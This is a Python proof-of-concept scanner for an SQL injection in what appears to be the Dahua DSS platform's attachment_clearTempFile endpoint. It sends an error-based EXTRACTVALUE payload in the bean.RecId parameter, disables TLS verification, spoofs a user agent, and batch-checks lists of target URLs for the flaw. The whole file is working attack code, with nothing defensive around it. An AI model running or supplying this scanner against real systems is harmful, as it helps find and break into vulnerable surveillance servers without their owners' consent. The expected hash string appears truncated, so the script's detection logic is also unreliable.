import requests
import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    taeget = urljoin(url, "/portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(1,concat(0x7e,md5(99999),0x7e))%20or%20(%2799%27=%2799&bean.TabName=1")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
    }
    try:

        response = requests.get(taeget, verify=False, headers=headers, timeout=25)
        if response.status_code ==200 and 'XPATH' in response.text and 'SQL' in response.text and 'd3eb9a9233e52948740d7eb8c3062d1' in response.text:
            print(f"\033[31mDiscovered；{url}: DaHuaDSS_attachment_clearTemp_SQLInject!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
